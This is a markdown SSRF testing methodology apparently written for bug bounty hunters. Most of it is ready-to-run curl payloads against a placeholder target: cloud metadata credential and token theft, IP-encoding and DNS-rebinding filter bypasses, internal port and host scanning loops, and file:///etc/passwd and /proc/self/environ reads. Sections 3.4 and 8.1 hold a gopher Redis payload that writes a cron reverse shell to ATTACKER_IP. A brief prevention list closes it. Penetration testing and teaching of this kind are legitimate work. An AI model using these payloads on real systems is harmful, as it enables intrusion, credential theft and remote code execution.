# SSRF (Server-Side Request Forgery)

> Comprehensive SSRF testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Server-Side Request Forgery (SSRF) tricks the server into making unintended requests to internal services, localhost, cloud metadata, or external systems, often leading to internal network pivots, metadata theft (AWS/GCP/Azure credentials), or DoS. Based on OWASP SSRF Prevention Cheat Sheet, PortSwigger SSRF labs & URL validation bypass cheat sheet (2024–2026 edition), PayloadsAllTheThings/SSRF, and recent 2025–2026 trends (IPv6 bypasses, redirect chains, Grafana/AWS metadata spikes, Langchain/CRM bypasses).

## Targets & Endpoints to Hunt

Any feature fetching remote resources from user input:

- **Image / avatar fetchers** (`?url=`, `?image=`)
- **Webhooks / callback URLs**
- **RSS / feed importers**
- **PDF / screenshot / preview generators** (wkhtmltopdf, headless browsers)
- **URL shorteners / proxies**
- **File / content importers** (Markdown, CSV from URL)
- **Open redirects chained to SSRF**
- **API integrations** (OAuth, notifications)
- **Debug / proxy / fetch tools**

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# SSRF-specific tools
go install github.com/swisskyrepo/SSRFmap@latest  # Automatic SSRF fuzzer
pip install gopherus                                    # Gopher link generator for RCE
go install github.com/In3tinct/See-SURF@latest          # SSRF parameter discovery

# Out-of-band detection
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# IP fuzzing utilities
go install github.com/dwisiswant0/ipfuscator@latest     # Generate alternative IP representations
```

## Methodology

### 1. Parameter Discovery & Enumeration

#### 1.1 Common Vulnerable Parameter Names / Patterns

```bash
# Extract URLs with potential SSRF parameters
grep -E "(url|uri|src|dest|redirect|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|style|doc|img|filename)=" crawledurls.txt | tee ssrf-param-urls.txt

# Use GF pattern matching for SSRF
gf ssrf crawledurls.txt > gf-ssrf.txt

# Custom pattern for additional SSRF vectors
grep -E "(access|admin|dbg|debug|edit|grant|test|alter|clone|create|delete|disable|enable|exec|execute|load|make|modify|rename|reset|shell|toggle|adm|root|cfg)=" crawledurls.txt | anew ssrf-params-additional.txt
```

#### 1.2 JavaScript Analysis for Hidden SSRF Endpoints

```bash
# Extract JavaScript files and search for fetch/axios calls
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo 'fetch\(["'"'"'][^"'"'"']+["'"'"']\)|axios\.(get|post|put|delete)\(["'"'"'][^"'"'"']+["'"'"']\)' | sed -E "s/.*['\"]([^'\"]+)['\"].*/\1/" | grep -E "(url|fetch|request)" | sort -u > js-ssrf-endpoints.txt
```

### 2. Basic Payloads & Probes

#### 2.1 Localhost Variants

```bash
# Basic localhost payloads
curl -s "https://target.com/fetch?url=http://127.0.0.1" | grep -i "localhost\|127.0.0.1\|error\|timeout"
curl -s "https://target.com/fetch?url=http://127.0.0.1:80" 
curl -s "https://target.com/fetch?url=http://127.0.0.1:8080"
curl -s "https://target.com/fetch?url=http://127.0.0.1:22"  # SSH banner leak
curl -s "https://target.com/fetch?url=http://127.0.0.1:6379"  # Redis

# IPv6 localhost
curl -s "https://target.com/fetch?url=http://[::1]"
curl -s "https://target.com/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]"

# Alternative localhost representations
curl -s "https://target.com/fetch?url=http://localhost"
curl -s "https://target.com/fetch?url=http://0.0.0.0"
curl -s "https://target.com/fetch?url=http://localtest.me"  # Resolves to ::1
```

#### 2.2 Cloud Metadata (High-Value PoC)

```bash
# AWS metadata endpoints
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/user-data"

# GCP metadata endpoints
curl -s "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl -s "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure metadata endpoints
curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"

# DigitalOcean metadata
curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/v1.json"
```

#### 2.3 File Protocol (if supported)

```bash
# File protocol for local file read
curl -s "https://target.com/fetch?url=file:///etc/passwd"
curl -s "https://target.com/fetch?url=file:///proc/self/environ"
curl -s "https://target.com/fetch?url=file:///etc/hosts"
```

### 3. Advanced Bypass & WAF / Filter Evasion (2025–2026)

Modern filters block `127.0.0.1` / `169.254.169.254` — use these bypass techniques:

#### 3.1 IP Obfuscation / Alternative Representations

```bash
# Decimal representation
curl -s "https://target.com/fetch?url=http://2130706433"  # 127.0.0.1
curl -s "https://target.com/fetch?url=http://2852039166"  # 169.254.169.254

# Hex representation
curl -s "https://target.com/fetch?url=http://0x7f.0x0.0x0.0x1"
curl -s "https://target.com/fetch?url=http://0x7f000001"
curl -s "https://target.com/fetch?url=http://0xa9fea9fe"  # 169.254.169.254

# Octal representation
curl -s "https://target.com/fetch?url=http://0177.0.0.1"
curl -s "https://target.com/fetch?url=http://0o177.0.0.1"

# IPv6 bypasses
curl -s "https://target.com/fetch?url=http://[::ffff:127.0.0.1]"
curl -s "https://target.com/fetch?url=http://[0:0:0:0:0:ffff:169.254.169.254]"
```

#### 3.2 DNS / Rebinding / Spoofed Domains

```bash
# DNS pinning with nip.io
curl -s "https://target.com/fetch?url=http://127.0.0.1.nip.io"
curl -s "https://target.com/fetch?url=http://169.254.169.254.nip.io"

# Custom domain pointing to localhost
curl -s "https://target.com/fetch?url=http://localhost.attacker.com"  # DNS points to 127.0.0.1
curl -s "https://target.com/fetch?url=http://spoofed-internal-service.com"

# DNS rebinding services
curl -s "https://target.com/fetch?url=http://make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms"
```

#### 3.3 Redirect Chains (Bypass Blacklists)

```bash
# Use open redirects to chain SSRF
curl -s "https://target.com/fetch?url=https://target.com/redirect?url=http://169.254.169.254"

# Using r3dir service
curl -s "https://target.com/fetch?url=https://307.r3dir.me/--to/?url=http://localhost"
curl -s "https://target.com/fetch?url=https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me"
```

#### 3.4 Protocol Variations

```bash
# Different protocols
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0A%0A%0D%0A%0D%0A%0D%0A"
curl -s "https://target.com/fetch?url=dict://127.0.0.1:11211/stats"
curl -s "https://target.com/fetch?url=ldap://127.0.0.1:389"
curl -s "https://target.com/fetch?url=sftp://127.0.0.1:22"
curl -s "https://target.com/fetch?url=tftp://127.0.0.1:69"
```

#### 3.5 URL Encoding / Normalization Tricks

```bash
# URL encoding
curl -s "https://target.com/fetch?url=http://127.0.0.1%23@evil.com"
curl -s "https://target.com/fetch?url=http://127.0.0.1%2523@evil.com"  # Double encoding

# Hex encoding
curl -s "https://target.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31"  # 127.0.0.1

# Unicode encoding
curl -s "https://target.com/fetch?url=http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ"  # example.com
```

#### 3.6 Recent 2025–2026 Bypasses

```bash
# IPv6-only resolution (Craft CMS GHSA bypass)
curl -s "https://target.com/fetch?url=http://[::]"

# URL parser discrepancies
curl -s "https://target.com/fetch?url=http://127.1.1.1:80\\@127.2.2.2:80/"
curl -s "https://target.com/fetch?url=http://127.1.1.1:80\\@@127.2.2.2:80/"
curl -s "https://target.com/fetch?url=http://127.1.1.1:80#\\@127.2.2.2:80/"
curl -s "https://target.com/fetch?url=http:127.0.0.1/"  # Missing //
```

### 4. Blind SSRF Detection

No direct response? Use out-of-band techniques:

#### 4.1 Interactsh / Burp Collaborator

```bash
# Generate interactsh payloads
interactsh-client -s &  # Start interactsh server in background
INTERACTSH_URL="https://YOUR_ID.oast.pro"  # Replace with your URL

# Test with interactsh
cat gf-ssrf.txt | qsreplace "$INTERACTSH_URL" | httpx -silent -threads 50

# Using Burp Collaborator
cat gf-ssrf.txt | qsreplace "https://YOURBURP.oastify.com" | httpx -silent -status-code
```

#### 4.2 Time-Based Detection

```bash
# Test for time delays (slow internal services)
time curl -s "https://target.com/fetch?url=http://127.0.0.1:22"  # SSH banner may cause delay
time curl -s "https://target.com/fetch?url=http://127.0.0.1:3306"  # MySQL

# Compare response times
curl -s -o /dev/null -w "%{time_total}\n" "https://target.com/fetch?url=http://example.com"
curl -s -o /dev/null -w "%{time_total}\n" "https://target.com/fetch?url=http://127.0.0.1"
```

### 5. Automated SSRF Scanning

#### 5.1 Using Nuclei Templates

```bash
# Scan with nuclei SSRF templates
nuclei -u https://target.com -t ~/nuclei-templates/ssrf/ -o nuclei-ssrf.txt

# Use specific SSRF detection templates
nuclei -u https://target.com -t ~/nuclei-templates/http/exposures/ -tags ssrf -o ssrf-exposures.txt
```

#### 5.2 Using FFUF for Parameter Fuzzing

```bash
# Fuzz parameters with SSRF payloads
ffuf -u "https://target.com/fetch?url=FUZZ" -w /home/pwn/wordlists/ssrf-payloads.txt -fc 404 -fs 0 -t 50

# Fuzz multiple parameters
ffuf -u "https://target.com/FUZZ?url=http://127.0.0.1" -w /home/pwn/wordlists/parameter-names.txt -mc 200 -t 50
```

#### 5.3 Using SSRFmap (Automatic Tool)

```bash
# Automated SSRF testing with SSRFmap
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata enumeration
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### 6. Cloud-Specific SSRF Techniques

#### 6.1 AWS Metadata Service (IMDSv1 & IMDSv2)

```bash
# IMDSv1 (legacy)
curl -s "http://169.254.169.254/latest/meta-data/"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME"

# IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/"

# Bypass IMDSv2 with open redirect chains
curl -s "https://target.com/fetch?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
```

#### 6.2 GCP Metadata Service

```bash
# Standard metadata endpoint
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"

# Instance metadata
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Project metadata
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
```

#### 6.3 Azure Metadata Service

```bash
# Instance metadata
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed identity tokens
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 7. Internal Network Discovery & Port Scanning

#### 7.1 Basic Port Scanning

```bash
# Scan common internal ports
for port in 22 80 443 3306 5432 6379 27017 11211 9200 9300; do
  curl -s "https://target.com/fetch?url=http://127.0.0.1:$port" | grep -q "Connection\|Error\|Timeout" || echo "Port $port might be open"
done

# Scan range
for port in {1..1000}; do
  curl -s -m 2 "https://target.com/fetch?url=http://127.0.0.1:$port" >/dev/null && echo "Port $port responded"
done
```

#### 7.2 Internal Host Discovery

```bash
# Common internal IP ranges
for i in {1..254}; do
  curl -s -m 2 "https://target.com/fetch?url=http://192.168.1.$i:80" | grep -q "200\|301\|302\|401\|403" && echo "Host 192.168.1.$i might be alive"
done

# Multiple ranges
for net in 10.0 172.16 192.168; do
  for i in {0..255}; do
    for j in {1..254}; do
      curl -s -m 1 "https://target.com/fetch?url=http://$net.$i.$j:80" 2>/dev/null | head -c1 | grep -q "." && echo "$net.$i.$j"
    done
  done
done
```

### 8. Protocol-Specific Exploitation

#### 8.1 Gopher Protocol for RCE

```bash
# Redis RCE via gopher
# Generate gopher payload with gopherus
python3 gopherus.py --exploit redis

# Example Redis RCE payload
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0A%0A%0D%0A%0D%0A%0D%0A"
```

#### 8.2 Dict Protocol for Memcached

```bash
# Memcached stats via dict
curl -s "https://target.com/fetch?url=dict://127.0.0.1:11211/stats"
```

#### 8.3 LDAP Protocol

```bash
# LDAP query via SSRF
curl -s "https://target.com/fetch?url=ldap://127.0.0.1:389/%0astats%0aquit"
```

### 9. Upgrade SSRF to XSS / Other Vulnerabilities

#### 9.1 SSRF to XSS via SVG

```bash
# Include malicious SVG with JavaScript
curl -s "https://target.com/fetch?url=http://attacker.com/poc.svg"

# SVG payload example
echo '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script>alert(document.domain)</script></svg>' > poc.svg
```

#### 9.2 SSRF to File Read / LFI

```bash
# File protocol for LFI
curl -s "https://target.com/fetch?url=file:///etc/passwd"
curl -s "https://target.com/fetch?url=file:///proc/self/environ"

# PHP wrappers
curl -s "https://target.com/fetch?url=php://filter/convert.base64-encode/resource=index.php"
```

### 10. Detection & Verification

- **Internal content leaked** – metadata keys, `/etc/hosts`, internal responses
- **Collaborator interaction** – DNS/HTTP callbacks to your server
- **Different response length / timing** – compared to normal requests
- **Error messages** – connection refused vs timeout (indicates port state)
- **Cloud credential exfiltration PoC** – but **never** exfil real creds — report immediately

### 11. Prevention (Developer View – 2025+ Best Practices)

- **Deny by default** – strict allow-list for URLs/domains
- **Disable unused schemes** (file://, gopher://, dict://, ldap://)
- **Network-level egress controls** – VPC endpoints, no metadata access from app
- **IMDSv2 enforcement** (AWS) – require session token
- **Input validation** – parse & canonicalize URLs before processing
- **WAF / positive security model** as defense-in-depth
- **Least privilege** for application IAM roles
- **Regular SSRF testing** in CI/CD pipelines

## References

- **Checklist**: [Web-Vulnerability-Testing-Checklist/SSRF.md](../Web-Vulnerability-Testing-Checklist/SSRF.md)
- **PortSwigger SSRF**: https://portswigger.net/web-security/ssrf
- **PortSwigger URL Validation Bypass Cheat Sheet**: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- **PayloadsAllTheThings – SSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- **OWASP SSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **2025–2026 trends**: Grafana SSRF → AWS creds, IPv6 bypasses, redirect chains (CVEs 2025–2026)

> **Happy (ethical) hunting** — SSRF remains critical in cloud-heavy 2026 (metadata theft, internal pivots, high bounties)!
